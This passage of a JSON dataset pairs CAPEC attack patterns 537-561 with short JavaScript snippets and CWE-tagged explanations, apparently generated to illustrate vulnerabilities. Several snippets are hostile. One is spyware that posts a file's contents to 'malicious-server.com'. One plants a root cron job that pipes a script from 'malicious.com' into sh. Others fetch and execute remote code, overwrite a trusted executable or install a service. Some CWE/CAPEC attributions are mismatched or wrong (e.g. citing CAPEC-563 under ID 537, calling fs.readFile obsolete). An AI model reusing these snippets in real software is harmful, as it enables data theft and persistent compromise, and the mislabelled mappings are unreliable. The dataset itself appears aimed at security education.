        "code_snippet": "const fs = require('fs');\nconst configFilePath = '/etc/app/config.json';\n\n// CWE-284: Improper Access Control\nif (fs.existsSync(configFilePath)) {\n  // CWE-377: Insecure Temporary File\n  const tempFilePath = '/tmp/config.json';\n  fs.copyFileSync(configFilePath, tempFilePath);\n\n  // CWE-99: Improper Control of Resource Identifiers\n  const configData = JSON.parse(fs.readFileSync(tempFilePath, 'utf8'));\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  configData.apiKey = 'malicious-api-key';\n\n  // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n  configData.debugMode = true;\n\n  fs.writeFileSync(configFilePath, JSON.stringify(configData, null, 2));\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker injects malicious data into a configuration file during the system's configuration or recalibration phase. The code first checks if the configuration file exists (CWE-284: Improper Access Control). It then creates an insecure temporary file (CWE-377: Insecure Temporary File) and reads the configuration data from it. The attacker modifies the configuration data by injecting a malicious API key (CWE-99: Improper Control of Resource Identifiers) and enabling debug mode (CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime). Finally, the modified configuration data is written back to the original configuration file, potentially causing the system to operate in a suboptimal manner that benefits the attacker. This code snippet embodies the main idea of CAPEC-137: Data Injected During Configuration."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode(filePath) {\n  const maliciousCode = `\n    // Malicious code injected\n    console.log('Sensitive data exfiltrated');\n    // CWE-497: Exposure of Sensitive System Information\n    const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n    console.log(sensitiveData);\n  `;\n\n  // CWE-1297: Unprotected Confidential Information on Device\n  fs.appendFileSync(filePath, maliciousCode);\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nfunction deployMaliciousFirmware() {\n  const firmwarePath = '/path/to/firmware.bin';\n  injectMaliciousCode(firmwarePath);\n  console.log('Malicious firmware deployed');\n}\n\ndeployMaliciousFirmware();",
        "description": "This JavaScript code snippet demonstrates the infiltration of a hardware development environment by injecting malicious code into a firmware file. The `injectMaliciousCode` function appends a piece of malicious code to a specified file, which reads and logs sensitive data from a protected path (CWE-506 and CWE-497). The `deployMaliciousFirmware` function simulates the deployment of this compromised firmware, representing a scenario where the firmware cannot be updated or patched (CWE-1329). This snippet embodies the main idea of CAPEC-563 by showing how an adversary could manipulate the development environment to insert malicious software, leading to potential disruption or further compromise of the victim's organization."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-library.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFileSync('malicious-library.js', data);\n    require('./malicious-library.js'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the library:', err);\n});\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableLibrary = require('vulnerable-library');\nvulnerableLibrary.execute();\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nfunction replicate() {\n  const payload = fs.readFileSync('malicious-library.js', 'utf8');\n  // Simulate spreading the malicious code\n  fs.writeFileSync('/tmp/malicious-copy.js', payload);\n}\nreplicate();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Open-Source Library Manipulation' by simulating the download and execution of a malicious library without integrity checks (CWE-494). The code then includes this untrusted library (CWE-829) and uses a vulnerable third-party component (CWE-1395). Additionally, it contains embedded malicious code (CWE-506) and simulates the replication of this code to another location (CWE-509). This snippet highlights the risks associated with incorporating unverified and potentially malicious open-source libraries into software projects."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC {\n  constructor() {\n    this.securityToken = 'secureToken123'; // CWE-1259: Improper Restriction of Security Token Assignment\n    this.debugMode = true; // CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\n  }\n\n  getSensitiveInfo() {\n    if (this.debugMode) {\n      console.log('Debug Info: Sensitive system information exposed'); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    }\n    return 'Sensitive System Information';\n  }\n\n  maliciousFunction() { // CWE-506: Embedded Malicious Code\n    console.log('Executing malicious functionality');\n    // Malicious code that disrupts or compromises the system\n  }\n}\n\nconst asic = new ASIC();\nasic.maliciousFunction();\nconsole.log(asic.getSensitiveInfo());",
        "description": "This JavaScript code snippet represents an ASIC (Application-Specific Integrated Circuit) class that embodies the main idea of the CAPEC 'ASIC With Malicious Functionality'. The class contains a security token that is improperly protected (CWE-1259), a debug mode that exposes sensitive system information (CWE-497), and a method that executes malicious functionality (CWE-506). The debug mode is enabled, which can help attackers learn about the system (CWE-11). The code demonstrates how an attacker with access to the development environment can insert malicious functionality into the system, leading to potential disruption or further compromise."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readBuffer(buffer, index) {\n  if (index < 0 || index >= buffer.length) {\n    console.log('Index out of bounds');\n    return null;\n  }\n  return buffer[index];\n}\n\nconst buffer = [1, 2, 3, 4, 5];\nconst index = 10; // Out-of-bounds index\nconst value = readBuffer(buffer, index);\nconsole.log('Value:', value);",
        "description": "This JavaScript code snippet demonstrates a potential buffer over-read vulnerability. The `readBuffer` function attempts to read a value from a buffer array at a specified index. If the index is out of the buffer's bounds (either negative or greater than or equal to the buffer's length), it logs an 'Index out of bounds' message and returns null. However, the code still allows the possibility of an out-of-bounds read if the index check is not properly handled or omitted. The example sets an out-of-bounds index (10) to illustrate the vulnerability. This code represents the main idea of CAPEC-129 (Overread Buffers) and is related to CWEs such as CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    // Observable Response Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Application Version: 1.0.0');\n  } else if (req.url === '/status') {\n    // Observable Behavioral Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Application Status: Running');\n  } else {\n    // Observable Timing Discrepancy\n    setTimeout(() => {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('Not Found');\n    }, 1000); // Intentional delay to reveal information\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens for incoming requests. It demonstrates several vulnerabilities related to application fingerprinting and observable discrepancies. When a request is made to '/version', the server responds with the application version, revealing internal state information (CWE-204). A request to '/status' returns the application's running status, indicating behavioral differences (CWE-205). For any other request, the server introduces a delay before responding with a 404 error, creating a timing discrepancy (CWE-208). These behaviors can be exploited by an adversary to fingerprint the application and gather sensitive information."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Trojan Horse: Malicious code hidden in seemingly benign functionality\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        // Embedded Malicious Code: Executes hidden malicious payload\n        executeMaliciousPayload();\n      });\n    });\n  });\n}\n\n// Spyware: Collects sensitive information without user consent\nfunction executeMaliciousPayload() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n  http.request({\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  }, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  }).write(JSON.stringify({ data: sensitiveData }));\n}\n\ndownloadFile('http://example.com/benign-file.txt', '/path/to/destination.txt');",
        "description": "This JavaScript code snippet demonstrates a targeted malware attack. The `downloadFile` function appears to perform a benign task of downloading a file from a URL and saving it to a specified destination. However, it contains a hidden malicious payload (`executeMaliciousPayload`) that is executed once the file download is complete. This payload reads sensitive data from the system and sends it to a malicious server, embodying the concept of spyware. The code represents the CAPEC idea of targeted malware by combining elements of a Trojan Horse (seemingly benign functionality with hidden malicious code), embedded malicious code, and spyware."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to the counterfeit site!</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and checks if a 'redirect' query parameter is present in the URL. If the 'redirect' parameter is found, the server performs an HTTP 302 redirect to the specified URL, which can be exploited for URL redirection to an untrusted site (CWE-601). If no 'redirect' parameter is present, the server responds with a basic HTML page, simulating a counterfeit website. This counterfeit site can be used to gather information or upload malware, embodying the main idea of the CAPEC. The code also indirectly touches on CWE-494 by not verifying the integrity of the redirect URL, and CWE-352 by not verifying the legitimacy of the request."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "const https = require('https');\n\nfunction fetchData(url) {\n  const options = {\n    hostname: 'fake-supplier.com',\n    port: 443,\n    path: '/data',\n    method: 'GET',\n    rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n  };\n\n  const req = https.request(options, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      console.log('Received data:', data);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\nfetchData('https://fake-supplier.com/data');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches data from a counterfeit organization, 'fake-supplier.com', which appears to be a legitimate supplier. The code includes CWE-295 (Improper Certificate Validation) by setting 'rejectUnauthorized' to false, allowing the acceptance of potentially malicious certificates. This represents the CAPEC concept of an adversary creating a false front organization to inject corrupted components into the supply chain. The code also implicitly touches on CWE-941 (Incorrectly Specified Destination in a Communication Channel) by directing the request to a potentially malicious actor."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "const fs = require('fs');\n\n// Function to read sensitive data from a file\nfunction readSensitiveData(filePath) {\n  try {\n    const data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Data:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Simulate reading sensitive data from a system resource\nreadSensitiveData('/path/to/sensitive/file.txt');\n\n// Function to simulate improper zeroization of sensitive data\nfunction improperZeroization(buffer) {\n  // Simulate clearing buffer by setting it to null (ineffective)\n  buffer = null;\n  console.log('Buffer after improper zeroization:', buffer);\n}\n\n// Simulate sensitive data in a buffer\nlet sensitiveBuffer = Buffer.from('Sensitive Information');\nimproperZeroization(sensitiveBuffer);\n\n// Simulate reading sensitive data after improper zeroization\nconsole.log('Sensitive Buffer Content:', sensitiveBuffer.toString());",
        "description": "This JavaScript code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC) by reading sensitive data from a file and simulating improper zeroization of sensitive data. The `readSensitiveData` function reads and prints the content of a file, representing the act of pulling data from system resources. The `improperZeroization` function attempts to clear a buffer containing sensitive information by setting it to null, which is ineffective and leaves the data accessible. This highlights CWE-1239 (Improper Zeroization of Hardware Register) and CWE-1330 (Remanent Data Readable after Memory Erase), showing how sensitive information can remain accessible even after an attempt to clear it."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "const fs = require('fs');\nconst path = '/path/to/multi-tenant/storage';\n\nfunction deleteTenantData(tenantId) {\n  const tenantDataPath = `${path}/${tenantId}`;\n  if (fs.existsSync(tenantDataPath)) {\n    fs.readdirSync(tenantDataPath).forEach(file => {\n      const filePath = `${tenantDataPath}/${file}`;\n      fs.writeFileSync(filePath, ''); // CWE-312: Cleartext Storage of Sensitive Information\n      fs.unlinkSync(filePath); // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n    });\n    fs.rmdirSync(tenantDataPath);\n  }\n}\n\nfunction allocateStorageToNewTenant(newTenantId) {\n  const newTenantDataPath = `${path}/${newTenantId}`;\n  if (!fs.existsSync(newTenantDataPath)) {\n    fs.mkdirSync(newTenantDataPath);\n  }\n  // Potential CWE-284: Improper Access Control if old data is not properly deleted\n}\n\n// Example usage\ndeleteTenantData('oldTenant');\nallocateStorageToNewTenant('newTenant');",
        "description": "This JavaScript code snippet demonstrates a scenario where data from a previous tenant in a multi-tenant environment is deleted before allocating the storage to a new tenant. The `deleteTenantData` function attempts to clear and delete files from the old tenant's directory, addressing CWE-1266 by removing sensitive data. However, it uses a simple overwrite with an empty string, which is not a secure method for data scrubbing (CWE-312). The `allocateStorageToNewTenant` function then allocates the storage to a new tenant, potentially leading to CWE-284 if the old data was not properly deleted. This code represents the main idea of CAPEC-284, highlighting the risks of incomplete data deletion in a multi-tenant environment."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device {\n  constructor() {\n    this.data = 'Sensitive Information';\n  }\n\n  destroy() {\n    // CWE-1082: Class Instance Self Destruction Control Element\n    delete this;\n  }\n\n  removeData() {\n    // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n    this.data = null; // Incomplete data removal\n  }\n\n  // CWE-1087: Class with Virtual Method without a Virtual Destructor\n  virtualMethod() {\n    console.log('This is a virtual method');\n  }\n}\n\n// Simulating physical destruction\nlet device = new Device();\ndevice.removeData();\ndevice.destroy();\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// Simulating a side-channel attack by observing power consumption\nfunction observePowerConsumption() {\n  console.log('Observing power consumption...');\n}\n\nobservePowerConsumption();\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectError() {\n  console.log('Injecting error into redundant block...');\n}\n\ninjectError();",
        "description": "This JavaScript code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating various vulnerabilities that could lead to the physical destruction or degradation of a device. The 'Device' class includes a method to destroy itself (CWE-1082) and a method to remove data incompletely (CWE-1301). The class also has a virtual method without a virtual destructor (CWE-1087). The code simulates a side-channel attack by observing power consumption (CWE-1300) and an error injection that could degrade hardware redundancy (CWE-1334). This snippet highlights how different vulnerabilities can be exploited to physically damage or degrade a device."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "const sensitiveData = 'TopSecretInformation';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfunction sendSensitiveData() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/api', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({ data: sensitiveData }));\n}\n\n// CWE-922: Insecure Storage of Sensitive Information\nlocalStorage.setItem('sensitiveData', sensitiveData);\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nfunction reuseResource() {\n  let reusedData = sensitiveData;\n  // Resource is reused without clearing sensitive information\n  console.log('Reused Data:', reusedData);\n}\n\nsendSensitiveData();\nreuseResource();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319) via an XMLHttpRequest. It also stores sensitive information insecurely in localStorage (CWE-922). Additionally, it reuses a resource containing sensitive information without clearing it first (CWE-226). These actions can lead to contamination of organizational information systems by exposing sensitive data to unauthorized actors, thereby requiring the system to be taken offline for investigation and mitigation."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://untrusted-source.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('malicious.js', data, (err) => {\n      if (err) throw err;\n      require('./malicious.js'); // Execute the downloaded code\n    });\n  });\n}).on('error', (err) => { console.error('Download failed:', err); });",
        "description": "This JavaScript code snippet demonstrates a scenario where a script downloads and executes code from an untrusted source without performing any integrity checks. The code uses the 'http' module to fetch a JavaScript file from a remote location and the 'fs' module to save it locally. After saving, it immediately requires and executes the downloaded file. This embodies the CAPEC 'Local Execution of Code' by showing how an adversary could introduce malicious code into a system. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is directly shown by the lack of verification of the downloaded code, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is demonstrated by requiring and executing the untrusted code, and CWE-506 (Embedded Malicious Code) is implied by the potential malicious nature of the downloaded script."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable code: Installing a new service with elevated privileges\nconst serviceName = 'MyService';\nconst servicePath = 'C:\\path\\to\\malicious\\service.exe';\n\n// Command to create a new service\nconst command = `sc create ${serviceName} binPath= ${servicePath} start= auto`; \n\n// Execute the command to install the service\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates the creation of a new service on a Windows system using Node.js. The 'exec' function from the 'child_process' module is used to run a system command that creates a new service named 'MyService' with a specified binary path. This service is set to start automatically with elevated privileges. The code embodies the CAPEC 'Install New Service' by showing how an adversary might install a new service that runs at startup, potentially with elevated privileges. The related CWEs are represented by the potential misuse of access control (CWE-284), the use of default or insecure settings (CWE-1188), and the risk of running applications with elevated privileges (CWE-520)."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmod('/etc/systemd/system/my-service.service', 0o777, (err) => {\n  if (err) throw err;\n  console.log('Permissions changed to 777');\n\n  // CWE-15: External Control of System or Configuration Setting\n  exec('systemctl restart my-service', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability by modifying an existing service configuration. It changes the permissions of a system service file to be world-writable (CWE-284: Improper Access Control), allowing any user to modify it. Then, it restarts the service using an external command (CWE-15: External Control of System or Configuration Setting). This could enable unauthorized users to alter the service configuration or execute arbitrary commands, embodying the main idea of the CAPEC 'Modify Existing Service'."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\nhttp.createServer((req, res) => {\n  if (req.url === '/install') {\n    const maliciousCode = `\n      const fs = require('fs');\n      fs.writeFile('/etc/cron.d/rootkit', '* * * * * root /bin/bash -c \"curl http://malicious.com/rootkit.sh | sh\"', (err) => {\n        if (err) throw err;\n      });\n    `;\n    fs.writeFile('/tmp/malicious.js', maliciousCode, (err) => {\n      if (err) throw err;\n      exec('node /tmp/malicious.js', (error, stdout, stderr) => {\n        if (error) {\n          console.error(`exec error: ${error}`);\n          return;\n        }\n        console.log(`stdout: ${stdout}`);\n        console.error(`stderr: ${stderr}`);\n      });\n    });\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Malicious code installed');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that listens for requests on port 8080. When a request is made to the '/install' endpoint, it writes a piece of malicious code to a temporary file and then executes it. The malicious code creates a cron job that periodically downloads and executes a script from a malicious server. This embodies the CAPEC of installing a rootkit by exploiting improper access control (CWE-284) and embedding malicious code (CWE-506). The code also demonstrates a Trojan Horse (CWE-507) by appearing to provide a benign HTTP service while hiding its true malicious intent. Additionally, it exposes sensitive system information (CWE-497) and performs OS command injection (CWE-78) by executing shell commands based on external input."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "const isAdmin = false;\n\nfunction checkAdmin() {\n  if (isAdmin) {\n    console.log('Access granted to admin functionality.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Bypassing the check by directly calling the admin function\nfunction adminFunction() {\n  console.log('Admin functionality executed.');\n}\n\n// Simulating an attack by bypassing the check\nadminFunction();",
        "description": "This JavaScript code snippet demonstrates a functionality bypass vulnerability. The `checkAdmin` function is intended to restrict access to admin functionality based on the `isAdmin` flag. However, an attacker can bypass this check by directly calling the `adminFunction`, which represents the restricted admin functionality. This bypass exemplifies the CAPEC concept of 'Functionality Bypass' and is related to CWEs such as 'Improper Protection of Alternate Path' (CWE-424) and 'Client-Side Enforcement of Server-Side Security' (CWE-602). The code highlights the risk of relying on client-side checks for security, which can be easily circumvented."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst users = {\n  'admin': 'password123' // CWE-521: Weak Password Requirements\n};\n\nhttp.createServer((req, res) => {\n  const auth = req.headers['authorization'];\n  if (!auth) {\n    res.writeHead(401, {'WWW-Authenticate': 'Basic realm=\"Secure Area\"'});\n    res.end('Authorization required');\n    return;\n  }\n\n  const [scheme, encoded] = auth.split(' ');\n  if (scheme !== 'Basic') {\n    res.writeHead(400);\n    res.end('Invalid authentication scheme');\n    return;\n  }\n\n  const [username, password] = Buffer.from(encoded, 'base64').toString().split(':');\n  if (users[username] && users[username] === password) {\n    res.writeHead(200);\n    res.end('Welcome!');\n  } else {\n    res.writeHead(403);\n    res.end('Forbidden');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a basic HTTP server that uses Basic Authentication to protect access. The server checks the 'Authorization' header for credentials, decodes them, and verifies them against a hardcoded user list. This example embodies several CWE weaknesses: CWE-521 (Weak Password Requirements) by using a simple password, CWE-308 (Use of Single-factor Authentication) by relying solely on Basic Authentication, and CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in an insecure manner (Base64 encoding). The code represents the main idea of the CAPEC by demonstrating how an attacker could use stolen credentials to gain unauthorized access to a remote service."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to change file extension handler\nfunction replaceFileExtensionHandler(extension, newHandlerPath) {\n  const handlerConfigPath = path.join(__dirname, 'fileHandlers.json');\n  let handlers;\n\n  // Read the current handlers configuration\n  try {\n    handlers = JSON.parse(fs.readFileSync(handlerConfigPath, 'utf8'));\n  } catch (err) {\n    console.error('Error reading handlers configuration:', err);\n    return;\n  }\n\n  // Update the handler for the given extension\n  handlers[extension] = newHandlerPath;\n\n  // Write the updated handlers configuration back to the file\n  try {\n    fs.writeFileSync(handlerConfigPath, JSON.stringify(handlers, null, 2), 'utf8');\n    console.log(`Handler for .${extension} files updated to ${newHandlerPath}`);\n  } catch (err) {\n    console.error('Error writing handlers configuration:', err);\n  }\n}\n\n// Example usage: replace the handler for .txt files\nreplaceFileExtensionHandler('txt', '/path/to/malicious/program');",
        "description": "This JavaScript code snippet demonstrates how an application might replace the file extension handler for a specific file type. The `replaceFileExtensionHandler` function reads a JSON configuration file (`fileHandlers.json`) that maps file extensions to their respective handlers. It then updates the handler for a given file extension to a new handler path, which could be an arbitrary or malicious program. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an attacker could modify the file handler configuration to execute arbitrary code when a file with the specified extension is opened. The related CWEs are represented by the potential vulnerabilities in reading and writing the configuration file, such as improper access control (CWE-284), reliance on file name or extension (CWE-646), and external control of file name or path (CWE-73)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "const fs = require('fs');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/file', 'utf8', function(err, data) {\n  if (err) {\n    return console.log(err);\n  }\n  console.log(data);\n});\n\n// Schedule a task to run at a later time\nsetTimeout(function() {\n  console.log('This task runs after 5 seconds');\n}, 5000);",
        "description": "This JavaScript code snippet demonstrates the use of an obsolete function (`fs.readFile`) to read a file, which aligns with CWE-477 (Use of Obsolete Function). Additionally, it schedules a task to run after a delay using `setTimeout`, which loosely represents the deprecated CAPEC concept of scheduling software to run. The code reads the contents of a file and logs it to the console, then schedules a task to log a message after 5 seconds. This example highlights potential issues with using outdated functions and scheduling tasks, which may lead to vulnerabilities if not properly managed."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmodSync('/path/to/trusted/executable', '777');\n\n// Replace the trusted executable with a malicious one\nfs.writeFileSync('/path/to/trusted/executable', '#!/bin/bash\\necho \"Malicious code executed\"\\n');\n\n// CWE-78: OS Command Injection\nexec('/path/to/trusted/executable', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious version. The `chmodSync` function is used to change the permissions of the trusted executable, allowing it to be overwritten. The `writeFileSync` function then replaces the trusted executable with a malicious script. Finally, the `exec` function is used to execute the malicious script, demonstrating an OS command injection vulnerability (CWE-78). This code embodies the main idea of the CAPEC 'Replace Trusted Executable' by showing how an attacker can replace a trusted executable with a malicious one to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "const net = require('net');\n\nconst rogueStation = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    console.log('Received data from satellite:', data.toString());\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    const tamperedData = data.toString().replace('original', 'tampered');\n    socket.write(tamperedData);\n  });\n});\n\nrogueStation.listen(8080, '0.0.0.0', () => {\n  console.log('Rogue uplink station listening on port 8080');\n});\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nconst legitimateStation = net.createConnection({ port: 8080, host: 'legitimate-satellite' }, () => {\n  legitimateStation.write('original message');\n});\n\nlegitimateStation.on('data', (data) => {\n  console.log('Received tampered data:', data.toString());\n});",
        "description": "This JavaScript code snippet simulates an orbital jamming attack where a rogue uplink station disrupts communication with a satellite. The rogue station listens for incoming data and tampers with it before sending it back. This demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the incoming data, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by modifying the data, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by allowing communication with an unintended endpoint. The code highlights the vulnerabilities that can be exploited in such an attack scenario."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});\n\n// CWE-307: No restriction on excessive authentication attempts\n// CWE-308: Single-factor authentication\n// CWE-309: Password system for primary authentication\n// CWE-262: No password aging mechanism\n// CWE-263: Long expiration period for passwords\n// CWE-654: Reliance on single factor for security decision\n// CWE-1273: No mechanism to prevent credential sharing",
        "description": "This JavaScript code snippet sets up a basic Express server with a single login endpoint. The credentials are stored in plain text within the code (CWE-522), and the authentication mechanism relies solely on a username and password (CWE-308, CWE-309). There are no measures to prevent brute force attacks (CWE-307), no password aging mechanism (CWE-262, CWE-263), and the security decision is based on a single factor (CWE-654). Additionally, there is no mechanism to prevent credential sharing (CWE-1273). This code embodies the main idea of CAPEC-Use of Known Domain Credentials by demonstrating how an adversary could exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\nconst credentials = { username: 'admin', password: 'password123' }; // CWE-521: Weak Password Requirements\n\nconst client = new net.Socket();\nclient.connect(445, '192.168.1.100', () => {\n  console.log('Connected to Windows Admin Share');\n  client.write(`AUTH ${credentials.username} ${credentials.password}`); // CWE-522: Insufficiently Protected Credentials\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-308: Use of Single-factor Authentication\n// CWE-309: Use of Password System for Primary Authentication\n// CWE-294: Authentication Bypass by Capture-replay\n// CWE-263: Password Aging with Long Expiration\n// CWE-262: Not Using Password Aging",
